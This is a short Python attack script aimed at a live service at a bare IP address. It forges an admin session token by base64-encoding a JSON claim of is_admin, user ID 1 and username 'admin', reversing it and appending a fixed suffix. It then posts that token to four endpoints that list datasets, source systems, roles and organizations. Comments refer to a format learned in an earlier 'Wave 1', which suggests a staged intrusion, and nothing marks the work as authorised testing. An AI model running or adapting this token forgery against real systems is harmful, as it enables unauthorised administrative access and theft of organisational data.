import requests
import json

base_url = "http://134.185.172.127:3011"
user_payload = {"user": "eyJhZG1pbiI6IHRydWV9"} # Admin true payload format, might need proper platform_decode format
# platform_decode requires reverse + base64 etc. We know the format from Wave 1.
# Let's import platform_decode logic
import base64
def encode_user(data):
    s = json.dumps(data)
    encoded = base64.b64encode(s.encode()).decode()
    reversed_str = encoded[::-1]
    return reversed_str + "12345"

payload = {"user": encode_user({"is_admin": 1, "user_id": 1, "username": "admin"})}

endpoints = ["/getDatasetGroups", "/getSourceSystems", "/getOrganizationRoles", "/getOrganizations"]

for ep in endpoints:
    url = base_url + ep
    print(f"Testing {url}")
    try:
        r = requests.post(url, json=payload)
        print("Status:", r.status_code)
        print("Response:", r.text[:200])
    except Exception as e:
        print("Error:", e)
    print("-" * 50)
